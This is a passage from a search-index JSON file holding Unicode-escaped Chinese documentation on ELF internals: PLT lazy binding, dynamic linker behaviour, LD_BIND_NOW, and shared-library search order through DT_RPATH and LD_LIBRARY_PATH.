79c\u53d1\u751f\u4e86\u9519\u8bef\uff0c\u5e76\u4e14\u52a8\u6001\u94fe\u63a5\u5668\u4e0d\u80fd\u591f\u89e3\u6790\u7b26\u53f7\u3002\u52a8\u6001\u94fe\u63a5\u5668\u5c06\u4f1a\u7ec8\u6b62\u7a0b\u5e8f\u3002\u5728\u60f0\u6027\u7ed1\u5b9a\u7684\u60c5\u51b5\u4e0b\uff0c\u8fd9\u79cd\u60c5\u51b5\u53ef\u80fd\u968f\u65f6\u53d1\u751f\u3002\u5f53\u5173\u95ed\u4e86\u60f0\u6027\u7ed1\u5b9a\u7684\u8bdd\uff0c\u52a8\u6001\u94fe\u63a5\u5668\u5728\u8fdb\u7a0b\u521d\u59cb\u5316\u7684\u8fc7\u7a0b\u4e2d\u5c31\u4e0d\u4f1a\u51fa\u73b0\u76f8\u5e94\u7684\u9519\u8bef\uff0c\u56e0\u4e3a\u8fd9\u4e9b\u90fd\u662f\u5728\u5e94\u7528\u83b7\u5f97\u63a7\u5236\u6743\u4e4b\u524d\u6267\u884c\u7684\u3002 \u5728 Linux \u7684\u8bbe\u8ba1\u4e2d\uff0c\u7b2c\u4e00\u4e2a\u4e4b\u540e\u7684 PLT \u6761\u76ee\u8fdb\u884c\u4e86\u5982\u4e0b\u7684\u51fd\u6570\u8c03\u7528 _dl_runtime_resolve ( link_map_obj , reloc_index ) \u8fd9\u91cc\u4ee5 32 \u4f4d\u4e3a\u4f8b\uff0864\u4f4d\u7c7b\u4f3c\uff09\uff0c\u5177\u4f53\u7684\u8fc7\u7a0b\u5982\u4e0b \u6839\u636e reloc_index \u8ba1\u7b97\u76f8\u5e94\u7684\u91cd\u5b9a\u4f4d\u8868\u9879\uff1a Elf32_Rel *reloc = JMPREL + index \u6839\u636e\u5f97\u5230\u7684\u91cd\u5b9a\u4f4d\u8868\u9879\u7684r_info\u5f97\u5230\u5bf9\u5e94\u7684\u7b26\u53f7\u5728\u7b26\u53f7\u8868\u4e2d\u7684\u7d22\u5f15\uff1a (reloc->r_info)>>8 \u7ee7\u800c\u5f97\u5230\u5bf9\u5e94\u7684\u7b26\u53f7\uff1a Elf32_Sym *sym = &SYMTAB[((reloc->r_info)>>8)] \u5224\u65ad\u7b26\u53f7\u7684\u7c7b\u578b\u662f\u5426\u4e3a R_386_JMP_SLOT\uff1a assert (((reloc->r_info)&0xff) == 0x7 ) if ((ELFW(ST_VISIBILITY) (sym->st_other), 0) == 0) if (sym->st_other) & 3 == 0 ) \u5224\u65ad\u8be5\u7b26\u53f7\u662f\u5426\u5df2\u7ecf\u89e3\u6790\u8fc7\u4e86\uff0c\u5982\u679c\u89e3\u6790\u8fc7\uff0c\u5c31\u4e0d\u4f1a\u518d\u53bb\u6267\u884c lookup \u64cd\u4f5c\u3002 \u5f97\u5230\u7b26\u53f7\u7684\u7248\u672c\uff0c\u5982\u679c ndx \u4e3a 0 \u7684\u8bdd\uff0c\u4f1a\u76f4\u63a5\u4f7f\u7528 local symbol\u3002 uint16_t ndx = VERSYM[ (reloc->r_info) >> 8] r_found_version *version = &l->l_version[ndx] \u6839\u636e name \u6765\u5bfb\u627e\u76f8\u5e94\u51fd\u6570\u5728\u5e93\u4e2d\u7684\u5730\u5740\u3002 name = STRTAB + sym->st_name","title":"Procedure Linkage Table"},{"location":"executable/elf/elf_structure/#eh_frame-related","text":".eh_frame_hdr .eh_frame","title":".eh_frame related"},{"location":"executable/elf/elf_structure/#_19","text":"\u8fd9\u91cc\u7ed9\u51fa\u4e00\u4e2aelf\u6587\u4ef6\u6bd4\u8f83\u7ecf\u5178\u7684\u4f8b\u5b50\u3002 \u6709\u65f6\u95f4\u4f1a\u7ed3\u5408\u5177\u4f53\u7684\u7a0b\u5e8f\uff0c\u7ed9\u51fa\u4e00\u4e2a\u66f4\u597d\u7684\u4f8b\u5b50\u3002","title":"\u4f8b\u5b50"},{"location":"executable/elf/elf_structure/#_20","text":"https://blogs.oracle.com/ali/gnu-hash-elf-sections https://bbs.pediy.com/thread-204642.htm","title":"\u53c2\u8003\u6587\u732e"},{"location":"executable/elf/program_linking/","text":"\u7a0b\u5e8f\u94fe\u63a5 \u00b6 \u9759\u6001\u94fe\u63a5 \u00b6 \u52a8\u6001\u94fe\u63a5 \u00b6 \u52a8\u6001\u94fe\u63a5\u4e3b\u8981\u662f\u5728\u7a0b\u5e8f\u521d\u59cb\u5316\u65f6\u6216\u8005\u7a0b\u5e8f\u6267\u884c\u7684\u8fc7\u7a0b\u4e2d\u89e3\u6790\u53d8\u91cf\u6216\u8005\u51fd\u6570\u7684\u5f15\u7528\u3002ELF\u6587\u4ef6\u4e2d\u67d0\u4e9b\u8282\u533a\u4ee5\u53ca\u5934\u90e8\u5143\u7d20\u5c31\u4e0e\u52a8\u6001\u94fe\u63a5\u6709\u5173\u3002\u52a8\u6001\u94fe\u63a5\u7684\u6a21\u578b\u7531\u64cd\u4f5c\u7cfb\u7edf\u5b9a\u4e49\u5e76\u5b9e\u73b0\u3002 Dynamic Linker \u00b6 \u52a8\u6001\u94fe\u63a5\u5668\u53ef\u4ee5\u7528\u6765\u5e2e\u52a9\u52a0\u8f7d\u5e94\u7528\u6240\u9700\u8981\u7684\u5e93\u5e76\u89e3\u6790\u5e93\u6240\u5bfc\u51fa\u7684\u52a8\u6001\u7b26\u53f7\uff08\u51fd\u6570\u548c\u5168\u5c40\u53d8\u91cf\uff09\u3002 \u5f53\u4f7f\u7528\u52a8\u6001\u94fe\u63a5\u6765\u6784\u9020\u7a0b\u5e8f\u65f6\uff0c\u94fe\u63a5\u7f16\u8f91\u5668\u4f1a\u5728\u53ef\u6267\u884c\u6587\u4ef6\u7684\u7a0b\u5e8f\u5934\u90e8\u6dfb\u52a0\u4e00\u4e2a PT_INTERP \u7c7b\u578b\u7684\u5143\u7d20\uff0c\u4ee5\u4fbf\u4e8e\u544a\u8bc9\u7cfb\u7edf\u5c06\u52a8\u6001\u94fe\u63a5\u5668\u4f5c\u4e3a\u7a0b\u5e8f\u89e3\u91ca\u5668\u6765\u8c03\u7528\u3002 \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5bf9\u4e8e\u7cfb\u7edf\u63d0\u4f9b\u7684\u52a8\u6001\u94fe\u63a5\u5668\uff0c\u4e0d\u540c\u7684\u7cfb\u7edf\u4f1a\u4e0d\u540c\u3002 \u53ef\u6267\u884c\u7a0b\u5e8f\u548c\u52a8\u6001\u94fe\u63a5\u5668\u4f1a\u5408\u4f5c\u8d77\u6765\u4e3a\u7a0b\u5e8f\u521b\u5efa\u8fdb\u7a0b\u955c\u50cf\uff0c\u5177\u4f53\u7684\u7ec6\u8282\u5982\u4e0b\uff1a \u5c06\u53ef\u6267\u884c\u6587\u4ef6\u7684\u5185\u5b58\u6bb5\u6dfb\u52a0\u5230\u8fdb\u7a0b\u955c\u50cf\u4e2d\u3002 \u5c06\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u7684\u5185\u5b58\u6bb5\u6dfb\u52a0\u5230\u8fdb\u7a0b\u955c\u50cf\u4e2d\u3002 \u4e3a\u53ef\u6267\u884c\u6587\u4ef6\u4ee5\u53ca\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u8fdb\u884c\u91cd\u5b9a\u4f4d\u3002 \u5982\u679c\u4f20\u9012\u7ed9\u4e86\u52a8\u6001\u94fe\u63a5\u5668\u4e00\u4e2a\u6587\u4ef6\u63cf\u8ff0\u7b26\u7684\u8bdd\uff0c\u5c31\u5c06\u5176\u5173\u95ed\u3002 \u5c06\u63a7\u5236\u6743\u4f20\u9012\u7ed9\u7a0b\u5e8f\u3002\u8fd9\u8ba9\u6211\u4eec\u611f\u89c9\u8d77\u6765\u5c31\u597d\u50cf\u7a0b\u5e8f\u76f4\u63a5\u4ece\u53ef\u6267\u884c\u6587\u4ef6\u5904\u62ff\u5230\u4e86\u6267\u884c\u6743\u9650\u3002 \u94fe\u63a5\u7f16\u8f91\u5668\u540c\u6837\u4e5f\u521b\u5efa\u4e86\u5404\u79cd\u5404\u6837\u7684\u6570\u636e\u6765\u534f\u52a9\u52a8\u6001\u94fe\u63a5\u5668\u6765\u5904\u7406\u53ef\u6267\u884c\u6587\u4ef6\u548c\u5171\u4eab\u76ee\u6807\u6587\u4ef6\uff0c\u4f8b\u5982 \u7c7b\u578b\u4e3aSHT_DYNAMIC\u7684\u8282.dynamic\u5305\u542b\u4e86\u5404\u79cd\u5404\u6837\u7684\u6570\u636e\uff0c\u5728\u8fd9\u4e2a\u8282\u7684\u5f00\u59cb\u5904\u5305\u542b\u4e86\u5176\u5b83\u52a8\u6001\u94fe\u63a5\u7684\u4fe1\u606f\u3002 \u7c7b\u578b\u4e3aSHT_HASH\u7684\u8282.hash\u5305\u542b\u4e86\u7b26\u53f7\u54c8\u5e0c\u8868\u3002 \u7c7b\u578b\u4e3aSHT_PROGBITS\u7684\u8282.got\u4ee5\u53ca.plt\u5305\u542b\u4e86\u4e24\u4e2a\u72ec\u7acb\u7684\u8868\uff1a\u5168\u5c40\u504f\u79fb\u8868\uff0c\u8fc7\u7a0b\u94fe\u63a5\u8868\u3002\u7a0b\u5e8f\u4f1a\u5229\u7528\u8fc7\u7a0b\u94fe\u63a5\u8868\u6765\u5904\u7406\u5730\u5740\u72ec\u7acb\u4ee3\u7801\u3002 \u56e0\u4e3a\u6240\u6709\u7684UNIX System V\u90fd\u4f1a\u4ece\u4e00\u4e2a\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u4e2d\u5bfc\u5165\u57fa\u672c\u7684\u7cfb\u7edf\u670d\u52a1\uff0c\u52a8\u6001\u94fe\u63a5\u5668\u4f1a\u53c2\u4e0e\u5230\u6bcf\u4e00\u4e2aTIS ELF-conforming\u7684\u7a0b\u5e8f\u6267\u884c\u8fc7\u7a0b\u4e2d\u3002 \u6b63\u5982\u7a0b\u5e8f\u52a0\u8f7d\u4e2d\u6240\u8bf4\u7684\uff0c\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u4e2d\u53ef\u80fd\u4f1a\u5360\u7528\u4e0e\u7a0b\u5e8f\u5934\u90e8\u4e2d\u8bb0\u5f55\u7684\u4e0d\u4e00\u6837\u7684\u865a\u62df\u5730\u5740\u3002\u52a8\u6001\u94fe\u63a5\u5668\u4f1a\u5728\u7a0b\u5e8f\u62ff\u5230\u63a7\u5236\u6743\u524d\uff0c\u91cd\u5b9a\u4f4d\u5185\u5b58\u955c\u50cf\uff0c\u66f4\u65b0\u7edd\u5bf9\u5730\u5740\u3002\u5982\u679c\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u786e\u5b9e\u52a0\u8f7d\u5230\u4e86\u5176\u5728\u7a0b\u5e8f\u5934\u90e8\u4e2d\u6307\u5b9a\u7684\u5730\u5740\u7684\u8bdd\uff0c\u90a3\u4e48\u90a3\u4e9b\u7edd\u5bf9\u5730\u5740\u7684\u503c\u5c31\u4f1a\u662f\u6b63\u786e\u7684\u3002\u4f46\u901a\u5e38\u60c5\u51b5\u4e0b\uff0c\u8fd9\u79cd\u60c5\u51b5\u4e0d\u4f1a\u53d1\u751f\u3002 \u5982\u679c\u8fdb\u7a0b\u7684\u73af\u5883\u4e2d\u6709\u540d\u53eb LD_BIND_NOW \u7684\u975e\u7a7a\u503c\uff0c\u90a3\u4e48\u52a8\u6001\u8fde\u63a5\u5668\u5728\u628a\u6743\u9650\u4f20\u9012\u7ed9\u7a0b\u5e8f\u65f6\uff0c\u4f1a\u6267\u884c\u6240\u6709\u7684\u91cd\u5b9a\u4f4d\u3002\u4f8b\u5982\uff0c\u6240\u6709\u7684\u5982\u4e0b\u73af\u5883\u53d8\u91cf\u7684\u53d6\u503c\u90fd\u4f1a\u6307\u5b9a\u8fd9\u4e00\u884c\u4e3a\u3002 LD_BIND_NOW = 1 LD_BIND_NOW = on LD_BIND_NOW = off \u5426\u5219\uff0cLD_BIND_NOW \u8981\u4e48\u4e0d\u5b58\u5728\u4e8e\u5f53\u524d\u7684\u8fdb\u7a0b\u73af\u5883\u4e2d\uff0c\u8981\u4e48\u5177\u6709\u4e00\u4e2a\u975e\u7a7a\u503c\u3002\u52a8\u6001\u94fe\u63a5\u5668\u53ef\u4ee5\u5ef6\u8fdf\u89e3\u6790\u8fc7\u7a0b\u94fe\u63a5\u8868\u7684\u5165\u53e3\uff0c\u8fd9\u5176\u5b9e\u5c31\u662fplt\u8868\u7684\u5ef6\u8fdf\u7ed1\u5b9a\uff0c\u5373\u5f53\u7a0b\u5e8f\u9700\u8981\u4f7f\u7528\u67d0\u4e2a\u7b26\u53f7\u65f6\uff0c\u518d\u8fdb\u884c\u5730\u5740\u89e3\u6790\uff0c\u8fd9\u53ef\u4ee5\u51cf\u5c11\u7b26\u53f7\u89e3\u6790\u4ee5\u53ca\u91cd\u5b9a\u4f4d\u7684\u8d1f\u8f7d\u3002 Function Address \u00b6 \u53ef\u6267\u884c\u6587\u4ef6\u4e2d\u7684\u51fd\u6570\u7684\u5730\u5740\u5f15\u7528\u548c\u5171\u4eab\u76ee\u6807\u4e2d\u4e0e\u5176\u76f8\u5173\u7684\u5f15\u7528\u53ef\u80fd\u5e76\u4e0d\u4f1a\u88ab\u89e3\u6790\u4e3a\u4e00\u4e2a\u503c\u3002\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u4e2d\u5bf9\u5e94\u7684\u5f15\u7528\u5c06\u4f1a\u88ab\u52a8\u6001\u94fe\u63a5\u5668\u89e3\u6790\u5230\u51fd\u6570\u672c\u8eab\u5bf9\u5e94\u7684\u865a\u62df\u5730\u5740\u5904\u3002\u53ef\u6267\u884c\u6587\u4ef6\u4e2d\u5bf9\u5e94\u7684\u5f15\u7528\uff08\u6765\u81ea\u4e8e\u5171\u4eab\u76ee\u6807\u6587\u4ef6\uff09\u5c06\u4f1a\u88ab\u94fe\u63a5\u7f16\u8f91\u5668\u89e3\u6790\u4e3a\u8fc7\u7a0b\u94fe\u63a5\u8868\u4e2d\u5bf9\u5e94\u51fd\u6570\u7684\u9879\u4e2d\u7684\u5730\u5740\u3002 \u4e3a\u4e86\u5141\u8bb8\u4e0d\u540c\u7684\u51fd\u6570\u5730\u5740\u53ef\u4ee5\u6309\u7167\u671f\u671b\u8fdb\u884c\u5de5\u4f5c\uff0c\u5982\u679c\u4e00\u4e2a\u53ef\u6267\u884c\u6587\u4ef6\u5f15\u7528\u4e86\u4e00\u4e2a\u5b9a\u4e49\u5728\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u4e2d\u7684\u51fd\u6570\uff0c\u90a3\u4e48\u94fe\u63a5\u7f16\u8f91\u5668\u5c31\u4f1a\u628a\u76f8\u5e94\u51fd\u6570\u7684\u8fc7\u7a0b\u94fe\u63a5\u8868\u9879\u653e\u5230\u4e0e\u5b83\u5173\u8054\u7684\u7b26\u53f7\u8868\u8868\u9879\u4e2d\u3002\u52a8\u6001\u94fe\u63a5\u5668\u4f1a\u5bf9\u8fd9\u79cd\u7b26\u53f7\u8868\u9879\u8fdb\u884c\u7279\u6b8a\u7684\u5904\u7406\u3002\u5982\u679c\u52a8\u6001\u94fe\u63a5\u5668\u5728\u5bfb\u627e\u4e00\u4e2a\u7b26\u53f7\uff0c\u5e76\u4e14\u9047\u5230\u4e86\u4e00\u4e2a\u7b26\u53f7\u8868\u9879\u5728\u53ef\u6267\u884c\u6587\u4ef6\u4e2d\u7684\u7b26\u53f7\uff0c\u90a3\u4e48\u5b83\u4f1a\u9075\u5faa\u5982\u4e0b\u7684\u89c4\u5219\uff1a \u5982\u679c\u7b26\u53f7\u8868\u9879\u7684 st_shndx \u4e0d\u662f SHN_UNDEF \uff0c\u52a8\u6001\u94fe\u63a5\u5668\u5c31\u4f1a\u627e\u5230\u8fd9\u4e2a\u7b26\u53f7\u7684\u5b9a\u4e49\uff0c\u5e76\u4e14\u4f7f\u7528\u5b83\u7684st_value\u6765\u4f5c\u4e3a\u7b26\u53f7\u7684\u5730\u5740\u3002 \u5982\u679c st_shndx \u662f SHN_UNDEF \u5e76\u4e14\u7b26\u53f7\u7684\u7c7b\u578b\u662f STT_FUNC \uff0c\u800c\u4e14 st_value \u6210\u5458\u4e0d\u662f0\uff0c\u52a8\u6001\u94fe\u63a5\u5668\u5c31\u4f1a\u628a\u8fd9\u4e2a\u8868\u9879\u89c6\u4e3a\u7279\u6b8a\u7684\uff0c\u5e76\u4e14\u4f7f\u7528 st_value \u7684\u503c\u4f5c\u4e3a\u7b26\u53f7\u7684\u5730\u5740\u3002 \u5426\u5219\uff0c\u52a8\u6001\u94fe\u63a5\u5668\u5c31\u4f1a\u8ba4\u4e3a\u5728\u53ef\u6267\u884c\u6587\u4ef6\u4e2d\u7684\u7b26\u53f7\u662f\u672a\u5b9a\u4e49\u7684\uff0c\u7136\u540e\u7ee7\u7eed\u5904\u7406\u3002 \u4e00\u4e9b\u91cd\u5b9a\u4f4d\u4e0e\u8fc7\u7a0b\u94fe\u63a5\u8868\u7684\u8868\u9879\u76f8\u5173\u3002\u8fd9\u4e9b\u8868\u9879\u88ab\u7528\u4e8e\u76f4\u63a5\u51fd\u6570\u8c03\u7528\uff0c\u800c\u4e0d\u662f\u5f15\u7528\u51fd\u6570\u5730\u5740\u3002\u8fd9\u4e9b\u91cd\u5b9a\u4f4d\u5e76\u4e0d\u4f1a\u6309\u7167\u4e0a\u9762\u7684\u65b9\u5f0f\u8fdb\u884c\u5904\u7406\uff0c\u56e0\u4e3a\u52a8\u6001\u94fe\u63a5\u5668\u5fc5\u987b\u4e0d\u80fd\u91cd\u5b9a\u5411\u8fc7\u7a0b\u94fe\u63a5\u8868\u9879\u5e76\u4f7f\u5176\u6307\u5411\u5b83\u4eec\u672c\u8eab\u3002 Shared Object Dependencies \u00b6 \u5f53\u94fe\u63a5\u7f16\u8f91\u5668\u5728\u5904\u7406\u4e00\u4e2a\u5f52\u6863\u5e93\u7684\u65f6\u5019\uff0c\u5b83\u4f1a\u63d0\u53d6\u51fa\u5e93\u6210\u5458\u5e76\u4e14\u628a\u5b83\u4eec\u62f7\u8d1d\u5230\u8f93\u51fa\u76ee\u6807\u6587\u4ef6\u4e2d\u3002\u8fd9\u79cd\u9759\u6001\u94fe\u63a5\u7684\u64cd\u4f5c\u5728\u6267\u884c\u8fc7\u7a0b\u4e2d\u662f\u4e0d\u9700\u8981\u52a8\u6001\u8fde\u63a5\u5668\u53c2\u4e0e\u7684\u3002\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u540c\u65f6\u4e5f\u63d0\u4f9b\u4e86\u670d\u52a1\uff0c\u52a8\u6001\u94fe\u63a5\u5668\u5fc5\u987b\u5c06\u5408\u9002\u7684\u5171\u4eab\u76ee\u6807\u6587\u4ef6attach\u5230\u8fdb\u7a0b\u955c\u50cf\u4e2d\uff0c\u4ee5\u4fbf\u4e8e\u6267\u884c\u3002\u56e0\u6b64\uff0c\u53ef\u6267\u884c\u6587\u4ef6\u4ee5\u53ca\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u4f1a\u4e13\u95e8\u63cf\u8ff0\u4ed6\u4eec\u7684\u4f9d\u8d56\u5173\u7cfb\u3002 \u5f53\u4e00\u4e2a\u52a8\u6001\u94fe\u63a5\u5668\u4e3a\u4e00\u4e2a\u76ee\u6807\u6587\u4ef6\u521b\u5efa\u5185\u5b58\u6bb5\u65f6\uff0c\u5728DT_NEEDED\u9879\u4e2d\u63cf\u8ff0\u7684\u4f9d\u8d56\u7ed9\u51fa\u4e86\u9700\u8981\u4ec0\u4e48\u4f9d\u8d56\u6587\u4ef6\u6765\u652f\u6301\u7a0b\u5e8f\u7684\u670d\u52a1\u3002\u901a\u8fc7\u4e0d\u65ad\u5730\u8fde\u63a5\u88ab\u5f15\u7528\u7684\u5171\u4eab\u76ee\u6807\u6587\u4ef6\uff08\u5373\u4f7f\u4e00\u4e2a\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u88ab\u5f15\u7528\u591a\u6b21\uff0c\u5b83\u6700\u540e\u4e5f\u53ea\u4f1a\u88ab\u52a8\u6001\u94fe\u63a5\u5668\u8fde\u63a5\u4e00\u6b21\uff09\u53ca\u5b83\u4eec\u7684\u4f9d\u8d56\uff0c\u52a8\u6001\u94fe\u63a5\u5668\u5efa\u7acb\u4e86\u4e00\u4e2a\u5b8c\u5168\u7684\u8fdb\u7a0b\u955c\u50cf\u3002\u5f53\u89e3\u6790\u7b26\u53f7\u5f15\u7528\u65f6\uff0c\u52a8\u6001\u94fe\u63a5\u5668\u4f1a\u4f7f\u7528BFS\uff08\u5e7f\u5ea6\u4f18\u5148\u641c\u7d22\uff09\u6765\u68c0\u67e5\u7b26\u53f7\u8868\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u9996\u5148\uff0c\u5b83\u4f1a\u68c0\u67e5\u53ef\u6267\u884c\u6587\u4ef6\u672c\u8eab\u7684\u7b26\u53f7\u8868\uff0c\u7136\u540e\u624d\u4f1a\u6309\u7167\u987a\u5e8f\u68c0\u67e5DT_NEEDED\u5165\u53e3\u4e2d\u7684\u7b26\u53f7\u8868\uff0c\u7136\u540e\u624d\u4f1a\u7ee7\u7eed\u67e5\u770b\u4e0b\u4e00\u6b21\u4f9d\u8d56\uff0c\u4f9d\u6b21\u7c7b\u63a8\u3002\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u5fc5\u987b\u53ef\u4ee5\u88ab\u7a0b\u5e8f\u8bfb\u53d6\uff0c\u5176\u5b83\u6743\u9650\u4e0d\u4e00\u5b9a\u9700\u8981\u3002 \u4f9d\u8d56\u5217\u8868\u4e2d\u7684\u540d\u5b57\u8981\u4e48\u662fDT_SONAME\u4e2d\u7684\u5b57\u7b26\u4e32\uff0c\u8981\u4e48\u662f\u7528\u4e8e\u6784\u5efa\u5bf9\u5e94\u76ee\u6807\u6587\u4ef6\u7684\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u7684\u8def\u5f84\u540d\u3002\u4f8b\u5982\uff0c\u5982\u679c\u4e00\u4e2a\u94fe\u63a5\u5668\u4f7f\u7528\u4e86\u4e00\u4e2a\u5e26\u6709DT_SONAME\u9879\u540d\u5b57\u53eb\u505alib1\u7684\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u4ee5\u53ca\u4e00\u4e2a\u5176\u4ed6\u8def\u5f84\u540d\u4e3a/usr/lib/lib2\u7684\u5171\u4eab\u76ee\u6807\u6587\u4ef6\uff0c\u90a3\u4e48\u53ef\u6267\u884c\u6587\u4ef6\u4e2d\u5c06\u4f1a\u5305\u542blib1\u4ee5\u53ca/usr/lib/lib2\u4f9d\u8d56\u5217\u8868\u3002 \u5982\u679c\u4e00\u4e2a\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u5177\u6709\u4e00\u4e2a\u6216\u8005\u591a\u4e2a/\uff0c\u4f8b\u5982/usr/lib/lib2\u6216\u8005directory/file\uff0c\u90a3\u4e48\u52a8\u6001\u94fe\u63a5\u5668\u4f1a\u76f4\u63a5\u4f7f\u7528\u90a3\u4e2a\u5b57\u7b26\u4e32\u6765\u4f5c\u4e3a\u8def\u5f84\u7684\u540d\u5b57\u3002\u5982\u679c\u540d\u5b57\u4e2d\u6ca1\u6709/\uff0c\u6bd4\u5982lib1\uff0c\u90a3\u4e48\u4ee5\u4e0b\u7684\u4e09\u79cd\u673a\u5236\u7ed9\u51fa\u4e86\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u641c\u7d22\u7684\u987a\u5e8f\u3002 \u9996\u5148\uff0c\u52a8\u6001\u6570\u7ec4\u6807\u8bb0DT_RPATH\u53ef\u80fd\u4f1a\u7ed9\u51fa\u4e00\u4e2a\u5305\u542b\u4e00\u7cfb\u5217\u4ee5:\u5206\u5272\u7684\u76ee\u5f55\u7684\u5b57\u7b26\u4e32\u3002\u4f8b\u5982 /home/dir/lib:/home/dir2/lib: \u544a\u8bc9\u6211\u4eec\u5148\u5728 /home/dir/lib \u76ee\u5f55\u641c\u7d22\uff0c\u7136\u540e\u518d\u5728 /home/dir2/lib \u641c\u7d22\uff0c\u6700\u540e\u5728\u5f53\u524d\u76ee\u5f55\u641c\u7d22\u3002 \u5176\u6b21\uff0c\u8fdb\u7a0b\u73af\u5883\u53d8\u91cf\u4e2d\u7684\u540d\u53ebLD_LIBRARY_PATH\u7684\u53d8\u91cf\u5305\u542b\u4e86\u4e00\u7cfb\u5217\u4e0a\u8ff0\u6240\u8bf4\u683c\u5f0f\u7684\u76ee\u5f55\uff0c\u6700\u540e\u53ef\u80fd\u4f1a\u6709\u4e00\u4e2a;\uff0c\u540e\u9762\u8ddf\u7740\u53e6\u5916\u4e00\u4e2a\u76ee\u5f55\u5217\u8868\u540e\u9762\u8ddf\u7740\u53e6\u5916\u4e00\u4e2a\u76ee\u5f55\u5217\u8868\u3002\u8fd9\u91cc\u7ed9\u51fa\u4e00\u4e2a\u4f8b\u5b50\uff0c\u6548\u679c\u4e0e\u7b2c\u4e00\u4e2a\u6240\u8bf4\u7684\u6548\u679c\u76f8\u540c LD_LIBRARY_PATH=/home/dir/lib:/home/dir2/lib: LD_LIBRARY_PATH=/home/dir/lib;/home/dir2/lib: LD_LIBRARY_PATH=/home/dir/lib:/home/dir2/lib:; \u6240\u6709\u7684LD_LIBRARY_PATH\u4e2d\u7684\u76ee\u5f55\u53ea\u4f1a\u5728\u641c\u7d22\u5b8cDT_RPATH\u624d\u4f1a\u8fdb\u884c\u641c\u7d22\u3002\u5c3d\u7ba1\u6709\u4e00\u4e9b\u7a0b\u5e8f\uff08\u5982\u94fe\u63a5\u7f16\u8f91\u5668\uff09\u5728\u5904\u7406;\u524d\u540e\u7684\u5217\u8868\u7684\u65b9\u5f0f\u4e0d\u540c\uff0c\u4f46\u662f\u52a8\u6001\u94fe\u63a5\u5668\u5904\u7406\u7684\u65b9\u5f0f\u5b8c\u5168\u4e00\u6837\uff0c\u9664\u6b64\u4e4b\u5916\uff0c\u52a8\u6001\u94fe\u63a5\u5668\u63a5\u53d7\u5206\u53f7\u8868\u793a\u8bed\u6cd5\uff0c\u6b63\u5982\u4e0a\u9762\u6240\u63cf\u8ff0\u7684\u6837\u5b50\u3002 \u6700\u540e\uff0c\u5982\u679c\u4ee5\u4e0a\u4e24\u7ec4\u76ee\u5f55\u65e0\u6cd5\u5b9a\u4f4d\u671f\u671b\u7684\u5e93\uff0c\u5219\u52a8\u6001\u94fe\u63a5\u5668\u641c\u7d22 /usr/lib \u8def\u5f84\u4e0b\u7684\u5e93\u3002 \u6ce8\u610f \u4e3a\u4e86\u5b89\u5168\u6027\uff0c\u5bf9\u4e8e set-user \u4ee5\u53ca set-group \u6807\u8bc6\u7684\u7a0b\u5e8f\uff0c\u52a8\u6001\u94fe\u63a5\u5668\u5ffd\u7565\u641c\u7d22\u73af\u5883\u53d8\u91cf\uff08\u4f8b\u5982 LD_LIBRARY_PATH \uff09\uff0c\u4ec5\u4ec5\u641c\u7d22 DT_RPATH \u6307\u5b9a\u7684\u76ee\u5f55\u548c /usr/lib \u3002","title":"\u7a0b\u5e8f\u94fe\u63a5"},{"location":"executable/elf/program_linking/#_1","text":"","title":"\u7a0b\u5e8f\u94fe\u63a5"},{"location":"executable/elf/program_linking/#_2","text":"","title":"\u9759\u6001\u94fe\u63a5"},{"location":"executable/elf/program_linking/#_3","text":"\u52a8\u6001\u94fe\u63a5\u4e3b\u8981\u662f\u5728\u7a0b\u5e8f\u521d\u59cb\u5316\u65f6\u6216\u8005\u7a0b\u5e8f\u6267\u884c\u7684\u8fc7\u7a0b\u4e2d\u89e3\u6790\u53d8\u91cf\u6216\u8005\u51fd\u6570\u7684\u5f15\u7528\u3002ELF\u6587\u4ef6\u4e2d\u67d0\u4e9b\u8282\u533a\u4ee5\u53ca\u5934\u90e8\u5143\u7d20\u5c31\u4e0e\u52a8\u6001\u94fe\u63a5\u6709\u5173\u3002\u52a8\u6001\u94fe\u63a5\u7684\u6a21\u578b\u7531\u64cd\u4f5c\u7cfb\u7edf\u5b9a\u4e49\u5e76\u5b9e\u73b0\u3002","title":"\u52a8\u6001\u94fe\u63a5"},{"location":"executable/elf/program_linking/#dynamic-linker","text":"\u52a8\u6001\u94fe\u63a5\u5668\u53ef\u4ee5\u7528\u6765\u5e2e\u52a9\u52a0\u8f7d\u5e94\u7528\u6240\u9700\u8981\u7684\u5e93\u5e76\u89e3\u6790\u5e93\u6240\u5bfc\u51fa\u7684\u52a8\u6001\u7b26\u53f7\uff08\u51fd\u6570\u548c\u5168\u5c40\u53d8\u91cf\uff09\u3002 \u5f53\u4f7f\u7528\u52a8\u6001\u94fe\u63a5\u6765\u6784\u9020\u7a0b\u5e8f\u65f6\uff0c\u94fe\u63a5\u7f16\u8f91\u5668\u4f1a\u5728\u53ef\u6267\u884c\u6587\u4ef6\u7684\u7a0b\u5e8f\u5934\u90e8\u6dfb\u52a0\u4e00\u4e2a PT_INTERP \u7c7b\u578b\u7684\u5143\u7d20\uff0c\u4ee5\u4fbf\u4e8e\u544a\u8bc9\u7cfb\u7edf\u5c06\u52a8\u6001\u94fe\u63a5\u5668\u4f5c\u4e3a\u7a0b\u5e8f\u89e3\u91ca\u5668\u6765\u8c03\u7528\u3002 \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5bf9\u4e8e\u7cfb\u7edf\u63d0\u4f9b\u7684\u52a8\u6001\u94fe\u63a5\u5668\uff0c\u4e0d\u540c\u7684\u7cfb\u7edf\u4f1a\u4e0d\u540c\u3002 